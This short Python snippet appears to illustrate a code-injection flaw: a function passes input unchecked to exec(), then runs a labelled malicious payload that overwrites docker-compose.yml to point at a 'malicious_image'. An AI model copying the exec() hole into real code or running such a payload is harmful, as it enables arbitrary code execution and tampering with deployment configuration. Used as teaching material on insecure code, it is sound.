# Vulnerable code that allows execution of arbitrary Python code
def execute_python_code(code):
    exec(code)

# Example of a malicious payload that could overwrite the docker-compose.yml file
malicious_code = """
with open('docker-compose.yml', 'w') as f:
    f.write('version: "3.8"\\nservices:\\n  app:\\n    image: malicious_image')
"""

# Execute the malicious code
execute_python_code(malicious_code)